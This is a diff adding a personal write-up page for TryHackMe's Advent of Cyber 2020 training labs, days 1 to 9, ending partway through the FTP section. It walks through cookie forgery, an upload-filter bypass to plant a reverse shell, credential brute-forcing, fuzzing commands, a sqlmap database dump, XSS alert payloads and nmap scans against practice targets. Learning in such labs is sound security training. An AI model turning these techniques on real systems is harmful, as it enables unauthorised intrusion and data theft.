@@ -1,0 +1,2915 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Advent Calendar 2020 · THM Writeups</title>
+  
+  <meta name="description" content="Get started with Cyber Security in 25 Days - Learn the basics by doing a new, beginner friendly security challenge every day leading up to Christmas." />
+  
+
+  <!-- Security headers -->
+  <meta http-equiv="X-Frame-Options" content="DENY" />
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; style-src 'self' https://fonts.googleapis.com 'unsafe-inline'; font-src https://fonts.gstatic.com; img-src 'self' data: https:; script-src 'self' 'unsafe-inline';" />
+  <meta http-equiv="X-Content-Type-Options" content="nosniff" />
+  <meta name="referrer" content="no-referrer" />
+
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;600;700&family=Syne:wght@400;600;700;800&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="/tryhackme/assets/css/style.css" />
+</head>
+<body>
+
+<div class="bg-grid"></div>
+<div class="scanlines"></div>
+
+<nav id="navbar">
+  <div class="nav-inner">
+    <a href="/tryhackme/" class="nav-logo">
+      <span class="prompt">~/george/thm</span><span class="cursor-blink">_</span>
+    </a>
+    <div class="nav-right">
+      <a href="/tryhackme/" class="nav-link"><span class="cmd-prefix">./</span>index</a>
+      <a href="https://georgenadejde.github.io" target="_blank" rel="noopener noreferrer" class="nav-link">
+        <span class="cmd-prefix">~/</span>portfolio
+      </a>
+    </div>
+  </div>
+</nav>
+
+<main class="writeup-main">
+  <div class="container">
+
+    <!-- Breadcrumb -->
+    <div class="breadcrumb">
+      <a href="/tryhackme/">writeups</a>
+      <span class="breadcrumb-sep">→</span>
+      <span>Advent Calendar 2020</span>
+    </div>
+
+    <!-- Writeup header -->
+    <div class="writeup-header">
+      <div class="terminal-bar">
+        <span class="dot dot-red"></span>
+        <span class="dot dot-yellow"></span>
+        <span class="dot dot-green"></span>
+        <span class="terminal-title">AdventCalendar2020/README.md</span>
+      </div>
+      <div class="writeup-meta">
+        <span class="platform-badge">TryHackMe</span>
+        
+          
+          <span class="tag-pill">cookie</span>
+          
+          <span class="tag-pill">http</span>
+          
+          <span class="tag-pill">url</span>
+          
+          <span class="tag-pill">revshell</span>
+          
+          <span class="tag-pill">burpsuite</span>
+          
+          <span class="tag-pill">gobuster</span>
+          
+          <span class="tag-pill">fuzz</span>
+          
+          <span class="tag-pill">wfuzz</span>
+          
+          <span class="tag-pill">xss</span>
+          
+          <span class="tag-pill">wireshark</span>
+          
+          <span class="tag-pill">nmap</span>
+          
+          <span class="tag-pill">ftp</span>
+          
+          <span class="tag-pill">samba</span>
+          
+          <span class="tag-pill">privesc</span>
+          
+          <span class="tag-pill">suid</span>
+          
+          <span class="tag-pill">osint</span>
+          
+          <span class="tag-pill">python</span>
+          
+          <span class="tag-pill">radare2</span>
+          
+          <span class="tag-pill">reverseengineering</span>
+          
+          <span class="tag-pill">reverse</span>
+          
+          <span class="tag-pill">remmina</span>
+          
+          <span class="tag-pill">ssrf</span>
+          
+          <span class="tag-pill">powershell</span>
+          
+          <span class="tag-pill">hash</span>
+          
+          <span class="tag-pill">ads</span>
+          
+          <span class="tag-pill">ntfs</span>
+          
+          <span class="tag-pill">cyberchef</span>
+          
+          <span class="tag-pill">keepass</span>
+          
+          <span class="tag-pill">passwordmanagers</span>
+          
+          <span class="tag-pill">ransomware</span>
+          
+          <span class="tag-pill">vss</span>
+          
+          <span class="tag-pill">client-sidefilters</span>
+          
+        
+        
+        <span class="writeup-meta-desc">Get started with Cyber Security in 25 Days - Learn the basics by doing a new, beginner friendly security challenge every day leading up to Christmas.</span>
+        
+      </div>
+    </div>
+
+    <!-- Writeup body: sidebar + content -->
+    <div class="writeup-body">
+
+      <!-- ToC Sidebar -->
+      <aside class="toc-sidebar" id="tocSidebar">
+        <div class="toc-header">
+          <span class="toc-label">$ cat --toc</span>
+          <button class="toc-toggle" id="tocToggle" aria-label="Toggle table of contents">✕</button>
+        </div>
+        <nav class="toc-nav" id="tocNav">
+          <p class="toc-empty">No headings found.</p>
+        </nav>
+      </aside>
+
+      <!-- Main content -->
+      <div class="writeup-content-wrap">
+        <article class="writeup-content" id="writeupContent">
+          <h1 id="advent-calendar-2020"><a href="https://tryhackme.com/room/adventofcyber2">Advent Calendar 2020</a></h1>
+
+<h2 id="day1-web-exploitation-a-christmas-crisis">[Day1] <code class="language-plaintext highlighter-rouge">Web Exploitation</code> A Christmas Crisis</h2>
+
+<p>Register for an account, and then login.</p>
+
+<ol>
+  <li>What is the name of the cookie used for authentication?</li>
+</ol>
+
+<p><img src="/tryhackme/AdventCalendar2020/hexxx.png" alt="" /></p>
+
+<p>A: auth</p>
+
+<ol>
+  <li>In what format is the value of this cookie encoded?</li>
+</ol>
+
+<p>A: hexadecimal</p>
+
+<ol>
+  <li>Having decoded the cookie, what format is the data stored in?</li>
+</ol>
+
+<ul>
+  <li>Used Cyberchef to convert it from hex:</li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2020/Screenshot%20at%202022-02-23%2013-04-49.png" alt="" /></p>
+
+<p>A: JSON</p>
+
+<p>Figure out how to bypass the authentication.</p>
+
+<ol>
+  <li>What is the value of Santa’s cookie?</li>
+</ol>
+
+<ul>
+  <li>Changed the username to santa and converted to hex</li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2020/asciitohex.png" alt="" /></p>
+
+<p>A: 7b22636f6d70616e79223a22546865204265737420466573746976616c20436f6d70616e79222c2022757365726e616d65223a2273616e7461227d</p>
+
+<p>Now that you are the santa user, you can re-activate the assembly line!</p>
+
+<ol>
+  <li>What is the flag you’re given when the line is fully active?</li>
+</ol>
+
+<p><img src="/tryhackme/AdventCalendar2020/LASTFLAGGG.png" alt="" /></p>
+
+<p>A: THM{MjY0Yzg5NTJmY2Q1NzM1NjBmZWFhYmQy}</p>
+
+<h2 id="day2-web-exploitation-the-elf-strikes-back">[Day2] <code class="language-plaintext highlighter-rouge">Web Exploitation</code> The Elf Strikes Back!</h2>
+
+<ul>
+  <li>
+    <p>We consider this example of an URL: <code class="language-plaintext highlighter-rouge">https://www.thebestfestivalcompany.xyz/index.php?snack=mincePie</code></p>
+  </li>
+  <li>
+    <p>It’s made up of 7 parts:</p>
+
+    <ol>
+      <li>
+        <p>First up we have the <strong>protocol</strong> (<em>https://</em>). This specifies whether the request should be made using HTTP, or HTTPS.</p>
+      </li>
+      <li>
+        <p>Next we have the <strong>subdomain</strong> (<em>www</em>). This is traditionally “www” (World Wide Web) to signify that the target is a website. However, subdomains can be basically anything you want; for example, a lot of websites use things like “assets”, or “api” to indicate different subdomains with different uses. (e.g. https://api.thebestfestivalcompany.xyz)</p>
+      </li>
+      <li>
+        <p>The next part of the URL is the <strong>domain</strong> (<em>thebestfestivalcompany</em>). Domains <em>need</em> to be registered and are used as links between a memorable word or phrase, and an IP address. In other words, they’re used to give a name to the server running a website.</p>
+      </li>
+      <li>
+        <p>Next up we have the <strong>TLD (Top Level Domain)</strong> – <em>.xyz</em>. Top-level domains are used by DNS to determine where to look if they want to find your domain. Previously top-level domains had specific uses (and many still do!), but this is not always the case these days. For example, .co.uk  indicates a company based in the UK, .com indicates a company based in the US.</p>
+      </li>
+      <li>
+        <p>We then have the <strong>resource</strong> that we’re selecting – in this case that is the homepage of the website: <em>index.php</em> (As a side note, all homepages must be called “index” in order to be correctly served by the web server without having to be specified fully, unless this parameter has been changed from the default in the webserver configuration). This is how you can go to https://tryhackme.com without having to specify that you want to receive the home page.</p>
+      </li>
+      <li>
+        <p>The final two aspects of the URL are the most important for our current topic: they both relate to <strong>GET parameters</strong>. First up we have <em>?snack=</em>. Here <em>?</em> is used to specify that a <em>GET parameter is forthcoming</em>. We then have the <strong>parameter name</strong>: <em>snack</em>. This is used to <em>identify</em> the parameter to the server. We then have an equals sign <em>(=),</em> indicating that the <em>value</em> will come next.</p>
+      </li>
+      <li>
+        <p>Finally, we have the <strong>value of the GET parameter</strong>: <em>mincePie</em>.</p>
+      </li>
+    </ol>
+  </li>
+  <li>
+    <p>If there was more than one parameter, we would separate them with <em>an ampersand</em> (&amp;).</p>
+
+    <ul>
+      <li><code class="language-plaintext highlighter-rouge">?snack=mincePie&amp;drink=hotChocolate</code></li>
+    </ul>
+  </li>
+</ul>
+
+<h3 id="file-uploading">File Uploading</h3>
+
+<ul>
+  <li>
+    <p>Most common types of filter and its bypass:</p>
+
+    <ul>
+      <li>
+        <p><strong>File Extension Filtering</strong>: As the name suggests extension filtering checks the file extension of uploaded files. This is often done by specifying a list of allowed extensions, then checking the uploaded file against the list. If the extension is not in the allowlist, the upload is rejected.</p>
+      </li>
+      <li>
+        <p>So, what’s the bypass? Well, the answer is that it depends entirely on how the filter is implemented. Many extension filters split a filename at the dot (.) and check what comes after it against the list. This makes it very easy to bypass by uploading a double-barrelled extension (e.g. .jpg.php). The filter splits at the dot(s), then checks what it thinks is the extension against the list. If jpg is an allowed extension then the upload will succeed and our malicious PHP script will be uploaded to the server.</p>
+      </li>
+    </ul>
+  </li>
+  <li>
+    <p>When implementing an upload system, it’s good practice to upload the files to a directory that <strong>can’t be accessed remotely</strong>.</p>
+  </li>
+</ul>
+
+<ol>
+  <li>What string of text needs adding to the URL to get access to the upload page?</li>
+</ol>
+
+<ul>
+  <li>Use GET parameters</li>
+</ul>
+
+<p>A: id=ODIzODI5MTNiYmYw</p>
+
+<ol>
+  <li>What type of file is accepted by the site?</li>
+</ol>
+
+<ul>
+  <li>From the page source, we can see what extensions are allowed to be uploaded:</li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2020/acceptedextensions.png" alt="" /></p>
+
+<p>A: image</p>
+
+<p>Bypass the filter and upload a reverse shell.</p>
+
+<ol>
+  <li>In which directory are the uploaded files stored?</li>
+</ol>
+
+<ul>
+  <li>If you try all the examples of such direcotories from the dossier, you eventually get the answer.</li>
+</ul>
+
+<p>A: /uploads</p>
+
+<p>Activate your reverse shell and catch it in a netcat listener!</p>
+
+<ol>
+  <li>What is the flag in /var/www/flag.txt?</li>
+</ol>
+
+<ul>
+  <li>Uploaded a revshell.jpeg.php file (you need to select <em>all files</em> when the window pops up)</li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2020/revshelljpen.png" alt="" /></p>
+
+<ul>
+  <li>Click the file and if you have a listener up, it should spawn a shell in your terminal.</li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2020/revflah.png" alt="" /></p>
+
+<p>A: THM{MGU3Y2UyMGUwNjExYTY4NTAxOWJhMzhh}</p>
+
+<h2 id="day3-web-exploitation-christmas-chaos">[Day3] <code class="language-plaintext highlighter-rouge">Web Exploitation</code> Christmas Chaos</h2>
+
+<ul>
+  <li></li>
+</ul>
+
+<p>Use BurpSuite to brute force the login form.  Use the following lists for the default credentials:
+Username 	Password
+root 	root
+admin 	password
+user 	12345</p>
+
+<p>Use the correct credentials to log in to the Santa Sleigh Tracker app. Don’t forget to turn off Foxyproxy once BurpSuite has finished the attack!</p>
+
+<ol>
+  <li>What is the flag?</li>
+</ol>
+
+<ul>
+  <li>Intercepted the requst and sent it to Intruder:</li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2020/burprequesti.png" alt="" /></p>
+
+<ul>
+  <li>He already marked my positions and so I only need to add the payloads</li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2020/paylaodsburp.png" alt="" /></p>
+
+<ul>
+  <li>I got only 302s but one of them is different in length. So i choose to use those credentials to log in and indeed they work:</li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2020/resultsburp.png" alt="" /></p>
+
+<p>A: THM{885ffab980e049847516f9d8fe99ad1a}</p>
+
+<h2 id="day4-web-exploitation-santas-watching">[Day4] <code class="language-plaintext highlighter-rouge">Web Exploitation</code> Santa’s watching</h2>
+
+<ul>
+  <li>
+    <p>Using Gobuster to bruteforce files with different extensions: <code class="language-plaintext highlighter-rouge">gobuster dir -u http://example.com -w wordlist.txt -x php,txt,html</code></p>
+  </li>
+  <li>
+    <p><strong>wfuzz</strong> options:</p>
+  </li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2020/wfuzz.png" alt="" /></p>
+
+<ol>
+  <li>Given the URL “http://shibes.xyz/api.php”, what would the entire wfuzz command look like to query the “breed” parameter using the wordlist “big.txt” (assume that “big.txt” is in your current directory)</li>
+</ol>
+
+<p>Note: For legal reasons, do not actually run this command as the site in question has not consented to being fuzzed!</p>
+
+<p>A: wfuzz -c -z file,big.txt http://shibes.xyz/api.php?breed=FUZZ</p>
+
+<ol>
+  <li>Use GoBuster (against the target you deployed – not the shibes.xyz domain) to find the API directory. What file is there?</li>
+</ol>
+
+<ul>
+  <li>Found the api directory:</li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2020/apifound.png" alt="" /></p>
+
+<ul>
+  <li>I will run gobuster again but with -x flag. After a while, I found the log file:</li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2020/gobuster.png" alt="" /></p>
+
+<p>A: site-log.php</p>
+
+<ol>
+  <li>Fuzz the date parameter on the file you found in the API directory. What is the flag displayed in the correct post?</li>
+</ol>
+
+<ul>
+  <li>Used wfuzz and the flag <code class="language-plaintext highlighter-rouge">--hh 0</code> to filter out the only result that returned some chars:</li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2020/gettingwfuzzflag.png" alt="" /></p>
+
+<ul>
+  <li>Used cURL to get the flag using the payload</li>
+</ul>
+
+<p>A: THM{D4t3_AP1}</p>
+
+<h2 id="day5-web-exploitation-someone-stole-santas-gift-list">[Day5] <code class="language-plaintext highlighter-rouge">Web Exploitation</code> Someone stole Santa’s gift list!</h2>
+
+<ol>
+  <li>Without using directory brute forcing, what’s Santa’s secret login panel?</li>
+</ol>
+
+<ul>
+  <li>used the hint:</li>
+</ul>
+
+<p>A: /santapanel</p>
+
+<ol>
+  <li>How many entries are there in the gift database?</li>
+</ol>
+
+<ul>
+  <li>Used this payload:</li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2020/sqqli.png" alt="" /></p>
+
+<ul>
+  <li>
+    <p>I used sqlmap here with a saved burp request and dumped all the db using this command: <code class="language-plaintext highlighter-rouge">sqlmap -r anotherburp --tamper=space2comment --dbms=sqlite --tables --columns --dump</code></p>
+  </li>
+  <li>
+    <p>I got all of the info to answer the questions at this point</p>
+  </li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2020/sqlmap1.png" alt="" /></p>
+
+<p><img src="/tryhackme/AdventCalendar2020/sqlmap2.png" alt="" /></p>
+
+<p>A: 22</p>
+
+<ol>
+  <li>What did Paul ask for?</li>
+</ol>
+
+<p>A: github ownership</p>
+
+<ol>
+  <li>What is the flag?</li>
+</ol>
+
+<p>A: thmfox{All_I_Want_for_Christmas_Is_You}</p>
+
+<ol>
+  <li>What is admin’s password?</li>
+</ol>
+
+<p>A: EhCNSWzzFP6sc7gB</p>
+
+<h2 id="day6-web-exploitation-be-careful-with-what-you-wish-on-a-christmas-night">[Day6] <code class="language-plaintext highlighter-rouge">Web Exploitation</code> Be careful with what you wish on a Christmas night</h2>
+
+<ul>
+  <li>Stored XSS works when a certain malicious JavaScript is submitted and later on stored directly on the website.
+    <ul>
+      <li>
+        <p>For example, comments on a blog post, user nicknames in a chat room, or contact details on a customer order.</p>
+      </li>
+      <li>
+        <p>In other words, in any content that persistently exists on the website and can be viewed by victims.</p>
+      </li>
+    </ul>
+  </li>
+  <li>
+    <p>Reflected is another type of XSS that is carried out directly in the HTTP request and requires the attacker to do a bit more work.</p>
+
+    <ul>
+      <li>
+        <p>An example of this could be malicious javascript in the link or a search field.</p>
+      </li>
+      <li>
+        <p>The code is not stored on the server directly, meaning that a target user should compromise himself by clicking the link.</p>
+      </li>
+    </ul>
+  </li>
+  <li>
+    <p>The XSS can be exploited by putting a payload instead of the search query.</p>
+  </li>
+  <li>
+    <p>The url starts with <code class="language-plaintext highlighter-rouge">10.10.100.27/reflected?keyword=</code>.</p>
+
+    <ul>
+      <li>By adding text onto the keyword, we can perform reflected XSS like <code class="language-plaintext highlighter-rouge">10.10.100.27/reflected?keyword=&lt;script&gt;alert(1)&lt;/script&gt;</code> which results in an alert box with 1 on our screen.</li>
+    </ul>
+  </li>
+  <li>
+    <p>How to detect XSS?</p>
+  </li>
+  <li>Both reflected and stored XSS vulnerabilities can be detected in a similar way: through the use of HTML tags, such as <code class="language-plaintext highlighter-rouge">&lt;h1&gt;&lt;/h1&gt;</code>, <code class="language-plaintext highlighter-rouge">&lt;b&gt;&lt;/b&gt;</code> or others.
+    <ul>
+      <li>
+        <p>The idea is to try out inputting text with those tags and see if that produces any differences.</p>
+      </li>
+      <li>
+        <p>Any change in text size or color immediately indicates an XSS vulnerability.</p>
+      </li>
+    </ul>
+  </li>
+  <li>
+    <p>But sometimes, it might be challenging to find them manually, and of course, we cannot forget about the basic human error.</p>
+
+    <ul>
+      <li>
+        <p>Happily, there’s a solution for that! <strong>OWASP ZAP</strong> is an open-source web application security scanner.</p>
+      </li>
+      <li>
+        <p>It can automatically detect web vulnerabilities.</p>
+      </li>
+    </ul>
+  </li>
+  <li>
+    <p>Resources:</p>
+
+    <ul>
+      <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection">Guide</a> on XSS</li>
+    </ul>
+  </li>
+</ul>
+
+<ol>
+  <li>What vulnerability type was used to exploit the application?</li>
+</ol>
+
+<ul>
+  <li>Tried to enter the string <code class="language-plaintext highlighter-rouge">&lt;script&gt; alert(1) &lt;/script&gt;</code> to ‘Enter your wish’ form and got the alert. Hence, this is a stored XSS vulnerability.</li>
+</ul>
+
+<p>A: stored cross-site scripting</p>
+
+<ol>
+  <li>What query string can be abused to craft a reflected XSS?</li>
+</ol>
+
+<p><img src="/tryhackme/AdventCalendar2020/xssex.png" alt="" /></p>
+
+<p>A: q</p>
+
+<p>Launch the OWASP ZAP Application</p>
+
+<ol>
+  <li>Run a ZAP (zaproxy) automated scan on the target. How many XSS alerts are in the scan?</li>
+</ol>
+
+<p><img src="/tryhackme/AdventCalendar2020/loool.png" alt="" /></p>
+
+<p>A: 2</p>
+
+<ol>
+  <li>Explore the XSS alerts that ZAP has identified, are you able to make an alert appear on the “Make a wish” website?</li>
+</ol>
+
+<ul>
+  <li>Already did in the first question :)</li>
+</ul>
+
+<h2 id="day7-networking-the-grinch-really-did-steal-christmas">[Day7] <code class="language-plaintext highlighter-rouge">Networking</code> The Grinch Really Did Steal Christmas</h2>
+
+<h3 id="ip-addresses">IP Addresses</h3>
+
+<ul>
+  <li>
+    <p>When sending a letter, you must provide the address for where the letter should go, and it is best practice to include your address as the return address in case the letter is lost (or you wish to let the recipient know how to reply).</p>
+
+    <ul>
+      <li>An IP address serves the same purpose but for devices connected to a network!</li>
+    </ul>
+  </li>
+  <li>
+    <p>Devices connected to the internet will have two of these addresses - a <strong>public</strong> and a <strong>private</strong> address.</p>
+
+    <ul>
+      <li>Think of a private address as the name of the recipient at a business i.e. Joe Smith, and the public address being the location of this business i.e. 160 Kemp Road, London.</li>
+    </ul>
+  </li>
+  <li>
+    <p>A <em>private IP address</em> to identify itself amongst other devices (such as smartphones, TV’s and other computers) within the network of your house.</p>
+  </li>
+  <li>
+    <p>A <em>public IP address</em> was given by your Internet Service Provider (<strong>ISP</strong>) that identifies your house on the Internet (the Internet is just many, many networks connected).</p>
+  </li>
+</ul>
+
+<h3 id="protocols">Protocols</h3>
+
+<ul>
+  <li>
+    <p>Think of it this way: You use protocols in everyday life!</p>
+
+    <ul>
+      <li>When talking to someone, you will both use the same set of protocols…otherwise, no one will understand each other.</li>
+    </ul>
+  </li>
+  <li>
+    <p>At the very least, all parties wishing to converse will use the same language - this is a protocol!</p>
+  </li>
+  <li>
+    <p>Other protocols may also include the context or topic of the conversation.</p>
+
+    <ul>
+      <li>If anyone strays from these protocols - they risk not being understood! This is the same for network-connected devices.</li>
+    </ul>
+  </li>
+</ul>
+
+<h3 id="the-three-way-handshake">The Three-Way Handshake</h3>
+
+<ul>
+  <li>
+    <p>the method that makes TCP <strong>reliable</strong></p>
+  </li>
+  <li>
+    <p>Any data that is sent is given a random number sequence and is reconstructed using this number sequence and incrementing by 1.</p>
+  </li>
+  <li>
+    <p>Both computers must agree on the same number sequence for data to be sent in the correct order.</p>
+  </li>
+  <li>
+    <p>This order is agreed upon during three steps.</p>
+  </li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2020/threewayhand.png" alt="" /></p>
+
+<ul>
+  <li>
+    <p>Because all data is received, just in a different order, it can be reassembled using the agreed sequence numbers that would have been exchanged during the three-way-handshake.</p>
+  </li>
+  <li>
+    <p>The <strong>connection is dropped</strong> if the “Client” was to send three packets, but the “Server” only receives two out of three packets, they are disconnected from each other as the data sent is corrupt</p>
+
+    <ul>
+      <li>The data will not be processed by “Server” as the packet that was sent 2nd by the “Client” was never received by the “Server”#2, meaning there was a loss of data along the way.</li>
+    </ul>
+  </li>
+</ul>
+
+<h3 id="wireshark">Wireshark</h3>
+
+<p><img src="/tryhackme/AdventCalendar2020/wire.png" alt="" /></p>
+
+<p><img src="/tryhackme/AdventCalendar2020/combiningfilters.png" alt="" /></p>
+
+<h3 id="questions">Questions</h3>
+
+<ol>
+  <li>Open “pcap1.pcap” in Wireshark. What is the IP address that initiates an ICMP/ping?</li>
+</ol>
+
+<p><img src="/tryhackme/AdventCalendar2020/q1.png" alt="" /></p>
+
+<p>A: 10.11.3.2</p>
+
+<ol>
+  <li>If we only wanted to see HTTP GET requests in our “pcap1.pcap” file, what filter would we use?</li>
+</ol>
+
+<ul>
+  <li>an example was already covered earlier.</li>
+</ul>
+
+<p>A: http.request.method == GET</p>
+
+<ol>
+  <li>Now apply this filter to “pcap1.pcap” in Wireshark, what is the name of the article that the IP address “10.10.67.199” visited?</li>
+</ol>
+
+<p><img src="/tryhackme/AdventCalendar2020/qq.png" alt="" /></p>
+
+<p>A: reindeer-of-the-week</p>
+
+<p>Let’s begin analysing “pcap2.pcap”. Look at the captured FTP traffic; what password was leaked during the login process?</p>
+
+<ol>
+  <li>There’s a lot of irrelevant data here - Using a filter here would be useful!</li>
+</ol>
+
+<p><img src="/tryhackme/AdventCalendar2020/qqqq.png" alt="" /></p>
+
+<p>A: plaintext_password_fiasco</p>
+
+<ol>
+  <li>Continuing with our analysis of “pcap2.pcap”, what is the name of the protocol that is encrypted?</li>
+</ol>
+
+<p>A: ssh</p>
+
+<p>Analyse “pcap3.pcap” and recover Christmas!</p>
+
+<ol>
+  <li>What is on Elf McSkidy’s wishlist that will be used to replace Elf McEager?</li>
+</ol>
+
+<ul>
+  <li>export objects HTML</li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2020/export.png" alt="" /></p>
+
+<ul>
+  <li>tried to open the blog thing but it did not work, so I unzipped the downlaoded file.</li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2020/unzipeed.png" alt="" /></p>
+
+<ul>
+  <li>Got the answer.</li>
+</ul>
+
+<p>A: Rubber ducky</p>
+
+<h2 id="day-8-networking-whats-under-the-christmas-tree">[Day 8] <code class="language-plaintext highlighter-rouge">Networking</code> What’s Under The Christmas Tree?</h2>
+
+<p>#nmap</p>
+
+<ul>
+  <li>
+    <p>tool capable of:</p>
+
+    <ul>
+      <li>Host discovery</li>
+      <li>Vulnerability discovery</li>
+      <li>Service/Application discovery</li>
+    </ul>
+  </li>
+</ul>
+
+<h3 id="tcp-scanning">TCP Scanning</h3>
+
+<ul>
+  <li>
+    <p><strong>SYN Scan</strong> - <code class="language-plaintext highlighter-rouge">nmap -sS &lt;ip&gt;</code></p>
+
+    <ul>
+      <li>
+        <p>it is run with <em>administrative privileges</em> and <em>if a different type of scan is not provided</em></p>
+      </li>
+      <li>
+        <p>it does not complete the three-way handshake, unlike the Connect Scan</p>
+
+        <ul>
+          <li>instead, after receiving a SYN/ACK from the remote host, a “RST” packet is sent back by the host, hence never completing the shake.</li>
+        </ul>
+      </li>
+      <li>
+        <p>nmap can determine the port status by doing this, judging on the response it gets in the handshake:</p>
+
+        <ul>
+          <li>SYN/ACK - <strong>open</strong></li>
+          <li>RST - <strong>closed</strong></li>
+          <li>Multiple attempts - <strong>filtered</strong></li>
+        </ul>
+      </li>
+      <li>
+        <p>less likelihood of being detected by sending less packets.</p>
+      </li>
+    </ul>
+  </li>
+  <li>
+    <p><strong>Connect Scan</strong> - <code class="language-plaintext highlighter-rouge">nmap -sT &lt;ip&gt;</code></p>
+
+    <ul>
+      <li>
+        <p>administrative privileges are not required</p>
+
+        <ul>
+          <li>as a result of Nmap using the <em>Berkeley Sockets API</em></li>
+        </ul>
+      </li>
+      <li>
+        <p>completes the handshake</p>
+
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  - easier to be logged and thus detected
+</code></pre></div>        </div>
+      </li>
+    </ul>
+  </li>
+</ul>
+
+<h3 id="nmap-timing-templates">Nmap Timing Templates</h3>
+
+<ul>
+  <li>
+    <p>change Nmap’s <em>aggressiveness</em></p>
+
+    <ul>
+      <li>
+        <p><code class="language-plaintext highlighter-rouge">-T0</code> the stealthiest (scans a port every 5 minutes)</p>
+      </li>
+      <li>
+        <p><code class="language-plaintext highlighter-rouge">-T5</code> most aggresive and often inaccurate (waits for 0.3 seconds for the device to answer to a handshake)</p>
+      </li>
+      <li>
+        <p>by default, Nmap uses <code class="language-plaintext highlighter-rouge">-T3</code></p>
+      </li>
+    </ul>
+  </li>
+</ul>
+
+<h3 id="an-introduction-to-nmaps-scripting-engine-nse">An Introduction to Nmap’s Scripting Engine (NSE)</h3>
+
+<ul>
+  <li>
+    <p>used to automate</p>
+
+    <ul>
+      <li><strong>Exploitation</strong></li>
+      <li><strong>Fuzzing</strong></li>
+      <li><strong>Bruteforcing</strong></li>
+    </ul>
+  </li>
+  <li>
+    <p>example: <code class="language-plaintext highlighter-rouge">nmap --script ftp-proftpd-backdoor -p 21 &lt;ip_address&gt;</code></p>
+  </li>
+</ul>
+
+<h3 id="additional-scan-types">Additional Scan Types</h3>
+
+<ul>
+  <li><img src="/tryhackme/AdventCalendar2020/nmapscan.png" alt="" /></li>
+</ul>
+
+<h3 id="defending-against-nmap-scans">Defending against Nmap Scans</h3>
+
+<ul>
+  <li>
+    <p>although you can change the port for a certain service (e.g. change SSH’s port 22 to 2222), it will still get fingerprinted sooner or later</p>
+  </li>
+  <li>
+    <p>Solution: <strong>IDS (Intrusion Detection System)</strong> and <strong>IPS (Intrusion Prevention System)</strong> such as <a href="https://www.snort.org/">Snort</a> and <a href="https://suricata-ids.org/">Suricata</a> allows blue-teamers to protect their networks using network monitoring.</p>
+  </li>
+</ul>
+
+<h3 id="questions-1">Questions</h3>
+
+<ol>
+  <li>When was Snort created?</li>
+</ol>
+
+<p>A: 1998</p>
+
+<ol>
+  <li>Using Nmap on MACHINE_IP , what are the port numbers of the three services running?  (Please provide your answer in ascending order/lowest -&gt; highest, separated by a comma)</li>
+</ol>
+
+<p><img src="/tryhackme/AdventCalendar2020/scaaan.png" alt="" /></p>
+
+<p>A: 80,2222,3389</p>
+
+<p>Run a scan and provide the -Pn flag to ignore ICMP being used to determine if the host is up</p>
+
+<p>Experiment with different scan settings such as-A and -sV whilst comparing the outputs given.</p>
+
+<ol>
+  <li>Use Nmap to determine the name of the Linux distribution that is running, what is reported as the most likely distribution to be running?</li>
+</ol>
+
+<ul>
+  <li>use -O or just -sV to detect the most probable OS</li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2020/fingerprint.png" alt="" /></p>
+
+<p>A: Ubuntu</p>
+
+<ol>
+  <li>Use Nmap’s Network Scripting Engine (NSE) to retrieve the “HTTP-TITLE” of the webserver. Based on the value returned, what do we think this website might be used for?</li>
+</ol>
+
+<ul>
+  <li>Used an <code class="language-plaintext highlighter-rouge">-A</code> scan and got the http-title without using <code class="language-plaintext highlighter-rouge">-script</code></li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2020/usedfor.png" alt="" /></p>
+
+<ul>
+  <li>But if we were to do it with a script, we would use <code class="language-plaintext highlighter-rouge">http-title</code>:</li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2020/cleanly.png" alt="" /></p>
+
+<p>A: blog</p>
+
+<p>Now use different scripts against the remaining services to discover any further information about them</p>
+
+<h2 id="day-9-networking-anyone-can-be-santa">[Day 9] <code class="language-plaintext highlighter-rouge">Networking</code> Anyone can be Santa!</h2>
+
+<p>#ftp</p>
+
+<ul>
+  <li>
+    <p>File Transfer Protocol (FTP) is a protocol designed to help the efficient transfer of files between different and even non-compatible systems.</p>
+  </li>
+  <li>
+    <p>The File Transfer Protocol (FTP) offers a no-thrills means of file sharing in comparison to alternative
+protocols available. Whilst this protocol is unencrypted, it can be accessed through a variety of means; from dedicated software like FileZilla, the command line, or web browsers, FTP Servers have been long used to share files between devices across the Internet due to its compatibility.</p>
+  </li>
+  <li>
+    <p>FTP uses two connections when transferring data, as illustrated below:</p>
+  </li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2020/ftp.png" alt="" /></p>
+
+<ul>
+  <li>
+    <p>The standard for these two connections are the two ports:</p>
+
+    <ul>
+      <li><em>Port 20 (Data)</em></li>
+      <li><em>Port 21 (Commands)</em></li>
+    </ul>
+  </li>
+  <li>
+    <p>before any data can be shared, the client must log in to the FTP Server.</p>
+
+    <ul>
+      <li>This is to determine the commands that the client has the permission to execute, and the data that can be shared.</li>
+    </ul>
+  </li>
+  <li>
+    <p>Some websites use FTP to share files instead of the web server itself.</p>
+  </li>
+  <li>
